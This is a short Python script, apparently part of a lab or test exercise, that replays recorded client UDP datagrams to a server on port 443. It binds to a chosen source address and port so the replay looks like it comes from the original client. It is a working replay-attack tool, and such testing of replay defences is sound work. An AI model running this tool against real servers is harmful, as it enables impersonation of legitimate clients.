#!/usr/bin/env python3
"""M4b: resend captured client datagrams (hex UDP payloads, one per line) to the
server, as an attacker that recorded the first flight would. Binds to the given
source address/port so the replay looks like it comes from the original client."""
import argparse, socket, time
p = argparse.ArgumentParser()
p.add_argument("hexfile"); p.add_argument("--dst", default="10.20.2.10")
p.add_argument("--src", default="0.0.0.0"); p.add_argument("--sport", type=int, default=0)
p.add_argument("--count", type=int, default=1); p.add_argument("--gap", type=float, default=0.5)
a = p.parse_args()
dgrams = [bytes.fromhex(l.strip().replace(":", "")) for l in open(a.hexfile) if l.strip()]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((a.src, a.sport))
for i in range(a.count):
    for d in dgrams:
        s.sendto(d, (a.dst, 443))
    time.sleep(a.gap)
print(f"replayed {len(dgrams)} datagrams x{a.count} from {s.getsockname()}")
